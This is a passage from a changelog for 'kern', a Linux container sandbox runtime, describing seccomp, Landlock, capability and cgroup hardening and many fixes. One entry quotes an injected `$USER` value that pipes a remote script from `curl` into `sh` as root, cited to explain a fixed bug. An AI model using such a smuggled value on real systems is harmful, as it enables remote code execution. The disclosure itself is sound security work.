  Fixed in the container-port check and the host-port check together: fixing one would have left a
  reader chasing a name their file does not contain on half the failures.

- **`kern box --entrypoint`: an override that actually overrides.** Repeatable (one argv element per
  occurrence, so an exec-form list needs no quoting convention), and `--entrypoint ""` clears the
  image's entrypoint the way compose's `entrypoint: []` does. Additive to the frozen CLI surface: no
  verb or flag was removed or renamed.

  It replaces two workarounds that could not work. The `docker` shim implemented `--entrypoint` by
  PREPENDING the value to the box command, and the compose parser folded `entrypoint:` into
  `command:` the same way. Both compose to `IMAGE_ENTRYPOINT ++ override ++ args` once the box
  prepends the image's own entrypoint - correct only for an image that HAS no entrypoint, which is
  never the case anyone reaches for an override in. Measured against
  `quay.io/keycloak/keycloak:26.1`, whose entrypoint is `kc.sh`: asking for a shell produced
  `kc.sh sh -c …` and the image answered `Unknown option: 'sh'`, which is what stopped a field
  report from getting a shell inside an image to diagnose a crash loop.

  Injection: verified - four, one per call site: the override ignored, the image CMD kept, the shim
  prepending again, and compose merging into `command`. Each turns its own case red.

  Both callers forward the flag now, so the CLI, the shim and compose cannot disagree about it, and
  the override discards the image's `CMD` as Docker documents - a default that belonged to the
  entrypoint being replaced.

- Two users on one machine can now both run boxes when `$XDG_RUNTIME_DIR` is shared between them (a
  WSL distro with WSLg exports the same path to every uid). Whoever started a box first used to lock
  the other out with `overlay scratch: Permission denied`. kern picks the next scratch location and
  says so.
- A failure to create the box scratch now names the directory.

## v0.7.1 - 2026-08-28

### Added

- **`kern doctor` reports what a VRAM cap on each GPU would be worth.** One line per DRM card.
  `TIER-HW` where the device enforces a partition (SR-IOV virtual function, or MIG instances
  configured). `TIER-SOFT` everywhere else, which on consumer hardware means a cooperative quota:
  worth density, fairness and overcommit accounting, **not a boundary against malicious code**. kern
  still slices no GPU; this publishes the judgement before the capability. There is no middle tier
  because `dmem` does not enforce the compute path ML tenants use: with `dmem.max` at 2 GB an 8 GB
  `hipMalloc` succeeded while `dmem.current` stayed at 0. Detection is read-only, opens no device,
  and costs 36 us per scan.

- **`--landlock-rw <path>` works on `kern run`**, not only on `kern box`. Landlock restricts the
  calling process, so no namespace is needed: `kern run --landlock-rw ~/project -- ./agent` confines
  the binary's writes to that directory. Three differences from `box`, all because there is no
  namespace: it grants only what you name plus the usual character devices, so `/tmp` and `/run` are
  not automatic; it refuses to run where the kernel has no Landlock; and it implies `no_new_privs`,
  so `sudo` inside the confined command stops working. A path that does not exist, or whose last
  component is a symlink, is refused rather than skipped. Additive: no existing invocation changes.

- **A fifth adversarial suite, `pentest/pentest-gpu-claims.sh`**, attacking a claim rather than a
  mechanism: whether `kern doctor`'s verdict about each card survives contact with the driver. T5 is
  the decisive case and it fails the way the tier model says it must, on three machines: a process
  with no vendor library in its address space reaches the driver with a raw ioctl. It starts no box,
  so it runs **in CI on every push**, unlike the other four.

### Fixed

- ⚠️ **A box that used to run uncapped on some hosts is now capped, and can be OOM-killed where it
  previously survived.** `--memory` and the pid cap now bind when kern runs **as root** on a host
  with no `systemd --user` manager: a container, or WSL2, where kern is uid 0. Boxes there had no
  ceiling at all, including the defaults that apply with no flags. `kern doctor` shows which kind of
  host you are on; `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are
  unaffected, and so is a ROOTLESS session with no user manager: there kern still has no cgroup it
  may write to, and still says so at every start. A colima guest reached over `colima ssh` is that
  second case, measured on Apple Silicon: the session lands in `/system.slice/ssh.service`, owned by
  root and not writable by the user, and no `user@<uid>.service` is ever created.

- **`kern doctor` interpolated `$USER` into a `sudo` command it invites you to paste.** With
  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root. It
  is now an allowlist of the portable name set, falling back to the numeric uid.

- **macOS is answered where a Mac user looks.** The installer refused Darwin and stopped; the README,
  the platform table and both SDK pages did not mention macOS at all. All of them now say the same
  thing: no native port, kern runs inside a Linux VM on a Mac, verified on Apple Silicon with an
  Ubuntu 24.04 guest, with the two obstacles that guest produces and their fixes. The installer looks
  for a VM you already have before suggesting one. CI runs those messages on a real Mac every push.

- **`kern examples` promised a per-line GPIO grant kern does not make.** It said `pins` exposes only
  those lines; the grant is chip-granular, and requesting any pin binds every `/dev/gpiochipN` on the
  host. Corrected where the field is declared, with a test that fails on the old wording.

- **A Landlock grant on a file rather than a directory no longer loses the whole ruleset.** The rule
  carried directory-only rights, the kernel answered `EINVAL` on a file, and the failure discarded
  every rule. `kern box --landlock-rw /etc/hosts` failed that way on both verbs.

- **`TIER-HW` claimed an enforcement it had not measured.** It read "per-tenant VRAM enforced by the
  device"; what the detector establishes is a topology, not a memory split. The string now names both
  gaps, including that the verdict is per card while MIG partitions per instance.

## v0.7.0 - 2026-08-24

The first published release: static binaries for x86_64 and aarch64, a Windows shim and a WSL rootfs,
each with a `.sha256`, from a GPG-signed and independently timestamped tag. Everything below shipped in it.

### Security

- **`--landlock-rw` is now fail-closed** (behaviour change, and the only one to a flag's meaning in
  this release). On a kernel without the Landlock LSM it used to warn and start the box with no path
  allowlist; it now refuses to start. kern already had an enforce-or-do-not-run family
  (`--require-limits` for cgroup caps, `--apparmor` for the LSM profile) and this was the one member
  that degraded, so the same script confined writes on a laptop and confined nothing on a board. The
  refusal names the flag, both reasons the LSM can be absent (not built in, or switched off with
  `lsm=`), and the way out. **Boxes that do not pass the flag are unaffected.** The cost is deliberate:
  a script that hard-codes `--landlock-rw` across a mixed fleet now fails on the boards rather than
  running unconfined there, and `kern doctor` reports the ABI so it can be gated. Verified on a
  Raspberry Pi 5 whose only LSM is `capability` (refused, message names the flag; without the flag the
  box starts) and on a Landlock ABI v8 host (write inside the allowlist succeeds, write outside is
  denied).
- The default seccomp filter is now a deny-by-default **allowlist** (moby's own default filter minus
  kern's 35 escape syscalls), not the wider denylist: a syscall outside the vetted set returns
  `ENOSYS`, and the escape vectors still hard-kill (`mount`/`unshare`/a namespace-flagged `clone`
  all SIGSYS, verified on a default box). This is Docker's own default posture minus 34, so it is at
  least as compatible while being strictly narrower - the whole future syscall surface is closed by
  default rather than reached. The wider denylist is the opt-out via `KERN_SECCOMP=denylist`;
  `--security-profile untrusted` is unchanged (allowlist + `--cap-drop ALL` + `--read-only`), and an
  `exec` reproduces the box's own recorded filter. Validated: a default box runs common workloads
  (shell, `ls`, `cat`, `id`) and 436 unit tests pass.
- Registry-posture forgery closed: every host-path input (`-v`, `--secret`, `--env-file`, `--rootfs`,
  build context and `-f`, `kern cp` in both directions, `save -o`) refuses any source that resolves
  onto the trust-bearing runtime dirs, by `(device, inode)` identity as well as path. The default is
  inverted: everything under the runtime dir is refused except the box-data `logs/` and `scratch/`.
- `socket(AF_VSOCK, …)` refused with `EAFNOSUPPORT` in both seccomp modes.
- The bounding-set drop is verified with `PR_CAPBSET_READ`, and under `--cap-drop ALL` every set
  (`CapEff`/`CapPrm`/`CapInh`/`CapAmb`/`CapBnd`) is read back all-zero from `/proc/self/status` -
  ambient included, since it survives `execve` and `NO_NEW_PRIVS` does not clear it.
- `CAP_SYS_PTRACE` dropped by default (16 caps), closing the **cross-UID** `/proc/<pid>/mem` read.
  (A same-uid sibling read inside one box is standard Linux and not a boundary; a host or peer-box
  pid is not visible in the box's pid namespace, so its memory is unreachable regardless.)
- `CAP_NET_ADMIN` and `CAP_SYS_ADMIN` dropped by default too, converging kern's default capability
  set onto Docker's/Podman's. They are re-kept CONDITIONALLY: `NET_ADMIN` for `--tun` (the box brings
  its own tunnel interface up; kern brings `lo` up before the drop, so loopback is unaffected) and
  `SYS_ADMIN` for `--privileged` (in-namespace `mount`), or either via `--cap-add`. `kern exec` stays
  strict and re-keeps neither, staying no more privileged than the box's PID 1. Their escape syscalls
  (the mount API, `bpf`) are seccomp-killed on a non-privileged box regardless, so this is
  defense-in-depth, not a boundary change.
- The seccomp mode is recorded and reproduced by `kern exec` and the health probe, not re-derived
  from the caller's env; an absent or corrupt record makes `exec` fail-loud.
- `KERN_MAX_CONCURRENT` enforced atomically under a `flock`, closing the fleet-cap TOCTOU.
- A SIGKILL'd detached supervisor's box is reaped via `cgroup.kill`.
- An inherited caller fd no longer leaks into the box: `shed_inherited_fds` before `execvp`
  (CVE-2016-9962 class).
- A pulled layer's setuid/setgid bit is stripped at extraction.
- OCI supply-chain hardening: a digest-pinned pull (`img@sha256:<hex>`) is content-addressed - the
  fetched manifest and the selected arch sub-manifest are sha256-verified, so a compromised registry
  cannot serve different bytes under a pin. The tar vetter also rejects a hardlink whose target
  descends an escaping symlink (a host-inode disclosure/corruption class), and an aggregate layer-count
  cap bounds a resource-exhaustion manifest.

### Fixed

- **A box's exit code no longer depends on the init system's version.** Same binary, same workload
  past its `--memory` cap: an Arduino UNO Q (systemd 257) reported **143** where a Raspberry Pi 5 (252)
  and a Jetson Orin Nano (249) reported **137**, and a DETACHED box on the newer manager left no exit
  record at all - `kern ps -a` empty, `kern wait` answering "no exit record for one" - so an SDK could
  not tell an OOM-killed box from one that never ran. The kernel had SIGKILLed the box on all three;
  what differed is that the newer systemd's default `OOMPolicy=stop` answers that same kill by stopping
  the unit, with a SIGKILL to the whole scope - including the kern process that had the box's status in
  hand and had not yet written it. Three things now hold it: on the scope path the box is capped in its
  OWN cgroup inside the scope (`kern-box-*`, at exactly the requested cap) with kern's supervisor in a
  `kern-sup` sibling, so the whole-box OOM kill takes the workload and not the bookkeeper; a fatal
  signal that reaches a waiting kern no longer costs the box its verdict; and the scope is asked for
  `OOMPolicy=continue` where the manager accepts it - PROBED once per boot, never version-gated,
  because an older manager rejects the property outright and would fail the `systemd-run` the box
  depends on. MEASURED after: **137 on all three boards, foreground and detached, exit record present**,
  with the cap read back at exactly `--memory` and no leaked scope, unit or process. `--memory` is now
  the WORKLOAD's ceiling on that path - kern's own ~1.3 MB no longer comes out of your budget - and the
  cost is ~2 ms of box start on the scope path only (x86's direct path measured unchanged at
  ~2.6 ms/box). Two things deliberately NOT done, both measured: `Delegate=yes` on the scope, which
  would be the textbook way to own that subtree and took a Jetson from 8 ms to **846 ms** per scope
  (kern does not need it - a user manager already creates the directory as the user), and a blanket
  `OOMPolicy=continue`, which on systemd 249 fails scope creation and would have started the box
  **uncapped**.
- **A signal aimed at a foreground `kern box` is aimed at the box.** kern used to die on a SIGTERM and
  leave the box to the PDEATHSIG cascade; it now forwards the signal, keeps waiting, and exits with the
  WORKLOAD's code - `docker run`'s contract, and what makes the exit code above survive a manager that
  stops the unit underneath it. A workload that ignores the first signal cannot make kern unkillable:
  the second exits immediately with `128+signo`, and `kern stop --stop-timeout 0` / SIGKILL remain the
  hard escapes. Behind a supervisor (a detached box) the signal is deliberately NOT relayed inwards -
  the box is already signalled directly, and relaying it was measured to record 143 for an OOM-killed
  box, kern's own SIGTERM beating the kernel's `oom.group` SIGKILL to the workload.
- **A service's `stop_grace_period` is its own upper bound again, not the longest one in the file.**
  `stop` shared ONE deadline across the stack, set to the longest grace configured anywhere in it,
  and floored the remainder at a second - so a service that asked for 1 s could be held far longer.
  MEASURED on a two-service stack, one asking 4 s and one asking 1 s, both hanging in their handler:
  the 1 s service was SIGKILLed at 5154 ms and the stop took 5010 ms. Each box's grace is now counted
  from the phase-1 signal against ITS OWN timeout: the same stack kills it at 1154 ms and finishes in
  4008 ms, which is max(grace) - the convergence the shared deadline existed for, without overriding
  what each service asked for. The bound stays one-sided by design: a member is never killed BEFORE
  its own grace, and can be killed later if a longer-grace member is torn down first, because the
  loop is sequential - and `stop` now waits on the SHORTEST grace first, which makes that loop
  optimal: each member waits only the difference from the one before it. MEASURED on a four-service
  stack asking 1, 2, 4 and 6 s, all hanging in their handler: before, the 1 s service was killed at
  6201 ms and the 4 s one at 6201; after, they die at 1195, 2196, 4200 and 6196, each on its own
  second, with the stack still finishing in 6008 ms. Reordering the waits reorders no shutdown -
  phase 1 signals every box at once - only which confirmation kern waits for first. Found by an
  external stress run of a mixed compose stack, in its own numbers: a service measured at 2005 ms
  alone took 3010 ms inside the stack.
- **Four lines of help and docs that no longer matched the code.** Found by re-reading the text
  against measured behaviour rather than against itself. `kern wait`'s help still said "Wait for
  RUNNING box(es)" after it learned to answer for one that already exited. `prune`'s said it removes
  "logs/health" while it also drops the exit record `wait` and `ps -a` read - which is the very thing
  that makes `wait` fail right after a `prune`, and that failure then blamed the one-hour window:
  measured, the box had exited two seconds earlier. And docs/DOCKER-COMPAT.md claimed `kill` "skips
  the wait": MEASURED at 3019 ms against `stop`'s 3013 on the same three-second grace, so it is a
  plain alias and a script that wants Docker's immediate kill wants `--stop-timeout 0`. That last one
  was written in this same release and was wrong when written.
- **`--stop-timeout`'s help says when the grace is skipped.** The flag read "Seconds the workload
  gets to exit on its own before the SIGKILL (default 10)", which promises a wait kern deliberately
  does not take when the box's init has no handler for the signal: a namespace PID 1 DISCARDS a
  signal it has no handler for, so the workload cannot die of it and the grace is a guaranteed wait
  for an event that can never happen (Docker and Podman sit it out anyway, measured at 10 278 and
  10 287 ms against kern's 21.9). The behaviour is unchanged and was already in BENCHMARKS.md and
  docs/DOCKER-COMPAT.md; what was missing is the one line a surprised reader looks at first. An
  external audit read `trap "" TERM` stopping in 4 ms as a defect, comparing it against the 3009 ms
  this project had published for `trap "sleep 60" TERM` - a handler that CATCHES the signal and never
  returns, which does spend the whole grace. Both numbers were right; the flag's own help did not say
  so. The two shapes are now an end-to-end test each, side by side, rather than prose.
- **An orphaned box is recoverable on the systemd-scope path too**, not only on the direct one. kern
  reaps a box whose supervisor was killed by remembering that box's own cgroup, and the path is
  recorded only when it names a `kern-box-*` dir - deliberately, because on the scope path a box's
  cgroup can be a scope kern did NOT create (`kern doctor` suggests `systemd-run --user --scope bash`
  to pay the scope cost once, and every box in that shell shares the shell's scope, so recording it
  would let a later reap `cgroup.kill` the user's whole session). The transient scope kern asks
  systemd for is now NAMED `kern-box-<pid>.scope`, which settles ownership by construction: an
  ambient scope is `run-*` and stays unrecorded. MEASURED on an Arduino UNO Q (aarch64, rootless,
  user systemd) before: SIGKILL a box's supervisor and the box vanished from `kern ps` while four of
  its processes kept running, with `kern stop` answering "no running box". After: `kern ps` shows it
  `orphaned`, `kern stop` reports "reaped via cgroup.kill", and no process is left. The recorded
  cgroup also lets the reaper hold engage there, so that board's exit codes went from 7 correct out
  of 10 under a bulk stop to 30 out of 30. The `.scope` suffix keeps the start-time orphan sweep off
  the dir (it reads the last `-` field as a pid, which never parses), and `stop` no longer rmdirs a
  cgroup that is a systemd unit - `--collect` removes it with the unit.
- **`kern wait` answers for a box that has already exited**, from the same exit record `kern ps -a`
  reads, for as long as `ps -a` still lists it (an hour). It used to refuse - "kern keeps no stopped
  boxes" - which was an inconsistency in kern's own surface rather than ephemerality: `ps -a` listed
  that box WITH its code while `wait` declined to print the same number, so a script that stopped a
  service could not ask how it had exited. Docker answers immediately there too. A box that is still
  running is unaffected: `wait` blocks until it exits, as before. Outside the window, and for an
  interactive `-it` box that never had a supervisor to record a code, `wait` still fails and says
  which case it is.
- **`--stop-timeout` is honoured in full, not rounded down to whole seconds.** `stop` waits the time
  LEFT until a deadline shared by the whole stack, and that remainder was truncated to seconds, so a
  box asked for 3 s got 2. Measured: a workload that flushes for 2.5 s under `--stop-timeout 3` was
  SIGKILLed at 2019 ms and recorded 137, where Docker's `stop -t 3` let the same workload finish in
  2799 ms and exit 5. kern now finishes it in 2526 ms with exit 5. A workload that exits at once
  still returns in ~16 ms, and one whose handler never finishes now consumes the whole 3 s rather
  than two thirds of it.
- **`kern stop` records the workload's own exit code, not a blanket 137.** A service that traps the
  stop signal and shuts down cleanly was reported as `exited (137)` - killed - by `kern ps -a` and
  `kern wait`, because the 137 was written when a stop was always a SIGKILL and the graceful phase
  arrived later without it following. Now the init's real status is read from its unreaped zombie and
  recorded, and 137 is kept for the case where it is the truth: an init that ignores the signal and is
  SIGKILLed. Measured against Docker on the same four-service stack (nginx, redis, and two shells that
  trap and exit 0 and 3): both runtimes now report 0, 0, 0 and 3, where kern previously reported 137
  four times. Reading that status is a race against whoever reaps the init - correct in 15 runs out of
  20 on its own - so `stop` holds the box's own reaper with SIGSTOP for the microseconds it takes,
  which makes it 30 out of 30. The hold is taken before any signal goes out (the group signal would
  otherwise kill the reaper first), released by a `Drop` on every path, and only ever applied to a
  process the box owns - never the user's systemd manager, which inherits an orphaned init, and never
  a FOREGROUND box's own process, which would print `Stopped` in the user's terminal. It is also
  taken only for a box with a dedicated cgroup, the case where a `stop` killed mid-hold is
  recoverable: `kern ps` then shows the box ORPHANED and the next `kern stop` reaps its cgroup whole.
  A box without one keeps the unguarded read rather than risking a stopped runner nothing can clear.
  On such a host the recorded code is therefore BEST-EFFORT: measured at 1 run in 12 recording 137 for
  a workload that exited 7, against 12 in 12 where a cgroup exists. It is not a timing window a caller
  can wait out - the same 12 runs had the workload's handler installed for 800 ms before the stop. Cost measured:
  none. A single stop is 16.20 ms against a 16.23 ms baseline and `stop --all` of 50 boxes is 110 ms
  against 119 ms, because consolidating the `/proc` readers onto one `stat_field` (reading `stat`
  rather than the much more expensive `status`) paid for the two extra signals.
- `kern gc` reaps orphaned box cgroups wherever a box was created, not only under kern.slice. A box
  that the OOM killer or a SIGKILL takes down leaves its `kern-box-*` cgroup dir behind (the RAII Drop
  that removes it cannot run on SIGKILL), and gc looked in one place while `apply_limits` creates in
  two: kern.slice on the direct path, the CALLER'S own cgroup on every other path. Measured on WSL2 as
  uid 0, where no kern.slice exists and boxes land at the cgroup root: three OOM-killed boxes left
  three dirs, a later box start did not reap them, and gc reported "nothing to prune" with them in
  place. After the fix the same sequence reports "reaped 3 orphaned box cgroups" and leaves none, while
  a live box's cgroup is untouched.
- kern no longer calls a box uncapped when the kernel is capping it. The uncapped notice and the
  `--require-limits` refusal keyed off "kern wrote no cap of its own", which is not the same question:
  on the systemd-scope path the scope carries `MemoryMax`/`TasksMax` and the backstops bind without
  kern writing a byte. Measured on a Raspberry Pi 5 over ssh, the box ran with `memory.max` 67108864,
  `memory.oom.group` 1 and `pids.max` 512 and was OOM-killed as a whole three times out of three
  (`dmesg`: `Memory cgroup out of memory`, three processes at once), while kern printed the notice and
  `--require-limits` refused to start. Both now ask the kernel what is in force: a memory ceiling that
  bounds the request anywhere up the tree, and a task ceiling at the box's own level (an ancestor's
  `pids.max` is shared with the session, so it does not count). The direct-path refusal is deliberately
  unchanged, since there the box's own cgroup is the sole enforcer by design. Verified both ways: on
  the Pi the notice is gone, `--require-limits` starts, and a 300 MB write is still killed 137; on a
  host with no delegation the notice and the refusal both still fire.
- A detached box's captured log is size-capped (two-file 32 MiB ring, zero-copy `splice`), so a
  runaway writer can't fill the session tmpfs.
- An OOM kills the whole box (`memory.oom.group = 1`), not one process.
- `kern ps`/`gc` under fd exhaustion no longer prunes or mis-reaps a live box (three-state liveness).
- A SIGKILL'd/OOM'd detached supervisor no longer leaves an unreachable "ghost": liveness reads
  `cgroup.events` `populated`; an orphan is visible (`--filter status=orphaned`) and reaped
  identity-safe against pid reuse.
- systemd detection probes the user manager's own control socket (`$XDG_RUNTIME_DIR/systemd/private`,
  what `systemd-run --user` actually connects to), so kern attempts the scope only where the manager is
  provably up: a dir-only host, or one with a reachable D-Bus bus but no user manager, no longer fails
  every box (it would connect and then die past kern's irreversible re-exec).
- A non-UTF-8 argument fails validation instead of panicking.
- The instance record is written atomically (temp + `rename`).
- `kern doctor` write-probes the real cap target; an unenforceable cap warns instead of running
  silently uncapped; `--pids-limit 1` is refused at parse; a second `vcpu:` profile warns.
- `volume ls --json` no longer lists names not on disk or misdirects a delete (display vs exact
  syscall form, `usable` flag); `kern <verb> --help` filters to the verb on a real terminal.
- `kern compose` anchors a service's relative `env_file`/`-v`/`rootfs` paths to the compose file's
  own directory, not the caller's working directory, so a stack runs the same from anywhere.
- Compose `restart: always`/`unless-stopped` is honoured on a pod member instead of being degraded to
  on-failure: kern's per-service supervisor keeps it up on ANY exit (including a clean 0) for the
  stack's lifetime. A standalone box's `always`/`unless-stopped` still takes the systemd path.
- A privileged port (`-p` below 1024) reports the real cause - a missing `CAP_NET_BIND_SERVICE`, or
  the address already in use - instead of a generic bind failure.
- A `--user`/image `USER` that cannot be mapped names the actual fix (install `newuidmap`/`newgidmap`
  + a `/etc/subuid`/`/etc/subgid` allocation, or use `--uid-range`) instead of blaming `--user`.
- A kern-TOML key (`health_cmd:`, `health_interval:`, `depends_healthy:`, `depends_completed:`, ...)
  written into a `docker-compose.yml` names the docker-compose equivalent (a `healthcheck:` block, or
  `depends_on: {SERVICE: {condition: service_healthy}}`) instead of a dead-end "unsupported", so a
  file that mixed the two spellings gets the fix rather than a silently missing health gate.
- The `kern-sandbox` SDKs decide `startup_failed` from an unforgeable channel: kern writes a "box
  started" byte to a caller-supplied `KERN_STARTED_FD` (CLOEXEC, so it never reaches the workload)
  only on the started path, so a workload can no longer forge the startup-failure marker on its own
  stderr to make the SDK raise. An older kern without the signal falls back to the stderr heuristic,
  which only ever over-reports a failure, never masks a real one.

### Added

- A CI gate fails, naming the syscall, when a new kernel `__NR_*` is neither allowed, denied, nor on
  the reviewed list (x86_64 + aarch64).
- `--require-limits` (or `KERN_REQUIRE_LIMITS`): refuse to start with a non-zero exit unless the
  memory and pids caps (including their defaults) are actually enforced, read back from the cgroup
  (the OOM / fork-bomb backstop), instead of running best-effort UNCAPPED. cpu/cpuset stay
  best-effort, as on the systemd-scope path (a QoS knob with no OOM/fork-bomb role). `--allow-uncapped`
  (`KERN_ALLOW_UNCAPPED`) is the explicit inverse: accept uncapped silently on a host with no cgroup
  delegation (nested CI). The two are mutually exclusive; the default is unchanged (warn once per
  host, run uncapped).
- `kern doctor` is more actionable: the multi-uid check names the commands to run (install the
  `newuidmap`/`newgidmap` helpers, then the `/etc/subuid`/`/etc/subgid` allocation line for your user,
  numeric-uid fallback when `$USER` is unset), not hardcoded to `apt`, and a new check reports whether
  `pasta` is present for pod/box outbound networking. kern uses these when present and never writes
  `/etc/subuid` or ships `pasta` itself.
- `--security-profile <untrusted>`: an opt-in bundle (seccomp allowlist + `--cap-drop ALL` +
  `--read-only`) for running code nobody has read, applied as a base that explicit flags and env
  override (`--cap-add X`, `KERN_SECCOMP=...`). `--cap-add ALL` and `--privileged` are refused under it
  (both would negate a constituent - all capabilities back, or a relaxed seccomp filter - leaving a box
  labelled untrusted that is not); a SET-but-unrecognised `KERN_SECCOMP` is a usage error, never a
  silent downgrade to the default filter. Closed set; prints its resolved constituents so the macro
  is visible. It does NOT touch Landlock (a write-allowlist needs
  the workload's real paths; build it from an audit run) and does NOT set `--require-limits` (which
  would break a cgroup-less host). The default is unchanged. It is a CLI/SDK flag; a compose service
  sets the same posture through its individual keys and `KERN_SECCOMP`, not a `[box.NAME]` macro key.
- The `kern-sandbox` SDKs (Python and Node) reach CLI parity for the above: `security_profile`
  /`securityProfile` maps to `--security-profile`, and `require_limits`/`requireLimits` to
  `--require-limits`. `security_profile="untrusted"` composes with the writable `-v` workspace (the
  root goes read-only, a bound mount stays writable). Note `require_limits` is the fail-closed gate,
  distinct from the pre-existing `enforce_limits` (which only picks the scope vs best-effort cap path)
  and mutually exclusive with the `KERN_ALLOW_UNCAPPED` env the SDK forwards.
- `kern ps -a`/`--all` lists recently-exited boxes (from their `waitexit` breadcrumbs), and
  `kern wait` resolves a box that has already exited, not only a live one.
- `--user` (and compose `user:`) accepts a NAME, resolved against the image's own
  `/etc/passwd`/`/etc/group`; the image's declared `USER` is honoured the same way. It fails closed
  on a host without `newuidmap` rather than silently running as in-box root.
- A compose `shm_size:` is recognised and left intentionally cgroup-bounded: `/dev/shm` is charged to
  the box memory cgroup (`mem_limit` / `--memory`), not pinned to a fixed size, so there is no 64 MB
  `/dev/shm` footgun to size around.
- `--apparmor <profile>` (CLI + the `kern-sandbox` Python/Node SDKs): enter a pre-loaded AppArmor
  (LSM) profile on the box's exec, layered over namespaces + seccomp (Docker's `--security-opt
  apparmor=`). A missing or unloadable profile fails the box CLOSED; `kern exec` re-enters the box's
  recorded profile so an exec is no less confined than the workload; a box whose posture predates this
  recording is refused rather than exec'd unconfined. kern applies no default profile.
- The Linux release build produces a size-optimized binary with a pinned-nightly `build-std` +
  `-Cpanic=immediate-abort` (~22% smaller than a plain stable `--release`, which a from-source
  `cargo install` still yields), reproducible byte-for-byte with the pinned toolchain. The source
  stays 100% stable Rust, so `cargo test` runs on the same source a release would ship. The exact
  sizes and the panic-diagnostics tradeoff this buys are in [OPEN_ITEMS.md](ROADMAP.md#known-gaps-and-what-would-settle-them).
